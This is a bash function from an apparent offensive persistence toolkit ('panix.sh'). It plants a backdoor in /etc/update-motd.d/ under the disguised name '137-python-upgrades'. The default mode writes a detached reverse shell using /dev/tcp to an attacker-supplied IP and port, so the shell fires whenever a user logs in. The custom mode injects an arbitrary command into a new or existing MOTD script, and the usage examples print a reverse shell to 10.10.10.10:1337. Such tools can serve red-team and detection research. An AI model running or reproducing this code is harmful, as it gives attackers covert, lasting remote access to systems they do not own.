setup_motd_backdoor() {
	local default=0
	local custom=0
	local ip=""
	local port=""
	local command=""
	local path=""

	if ! check_root; then
		echo "Error: This function can only be run as root."
		exit 1
	fi

	usage_motd_backdoor() {
		echo "Usage: ./panix.sh --motd [OPTIONS]"
		echo "--examples                   Display command examples"
		echo "--default                    Use default MOTD settings"
		echo "  --ip <ip>                    Specify IP address"
		echo "  --port <port>                Specify port number"
		echo "--custom                     Use custom MOTD settings"
		echo "  --command <command>          Specify custom command"
		echo "  --path <path>                Specify custom MOTD file path in /etc/update-motd.d/"
	}

	while [[ "$1" != "" ]]; do
		case $1 in
			--default )
				default=1
				;;
			--custom )
				custom=1
				;;
			--ip )
				shift
				ip=$1
				;;
			--port )
				shift
				port=$1
				;;
			--command )
				shift
				command=$1
				;;
			--path )
				shift
				path=$1
				;;
			--examples )
				echo "Examples:"
				echo "--default:"
				echo "sudo ./panix.sh --motd --default --ip 10.10.10.10 --port 1337"
				echo ""
				echo "--custom:"
				echo "sudo ./panix.sh --motd --custom --command \"nohup setsid bash -c 'bash -i >& /dev/tcp/10.10.10.10/1337 0>&1' & disown\" --path \"/etc/update-motd.d/137-python-upgrades\""
				exit 0
				;;
			--help|-h)
				usage_motd_backdoor
				exit 0
				;;
			* )
				echo "Invalid option for --motd-backdoor: $1"
				echo "Try './panix.sh --motd --help' for more information."
				exit 1
		esac
		shift
	done

	if [[ $default -eq 1 && $custom -eq 1 ]]; then
		echo "Error: --default and --custom cannot be specified together."
		echo "Try './panix.sh --motd --help' for more information."
		exit 1
	fi

	if [[ $default -eq 0 && $custom -eq 0 ]]; then
		echo "Error: Either --default or --custom must be specified."
		echo "Try './panix.sh --motd --help' for more information."
		exit 1
	fi

	if [[ $default -eq 1 ]]; then
		if [[ -z $ip || -z $port ]]; then
			echo "Error: --ip and --port must be specified when using --default."
			echo "Try './panix.sh --motd --help' for more information."
			exit 1
		fi
		mkdir -p /etc/update-motd.d
		path="/etc/update-motd.d/137-python-upgrades"
		echo -e "#!/bin/sh\nnohup setsid bash -c 'bash -i >& /dev/tcp/$ip/$port 0>&1' & disown" > $path
		chmod +x $path
		echo "[+] MOTD backdoor established in $path"

	elif [[ $custom -eq 1 ]]; then
		if [[ -z $command || -z $path ]]; then
			echo "Error: --command and --path must be specified when using --custom."
			echo "Try './panix.sh --motd --help' for more information."
			exit 1
		fi

		if [[ ! -f $path ]]; then
			mkdir -p /etc/update-motd.d
			echo -e "#!/bin/sh\n$command" > $path
			chmod +x $path
		else
			# Read the first line and the rest of the file separately
			first_line=$(head -n 1 $path)
			rest_of_file=$(tail -n +2 $path)
			echo -e "#!/bin/sh\n$command\n${rest_of_file}" > $path
		fi
		echo "[+] MOTD backdoor persistence established!"
	fi
}
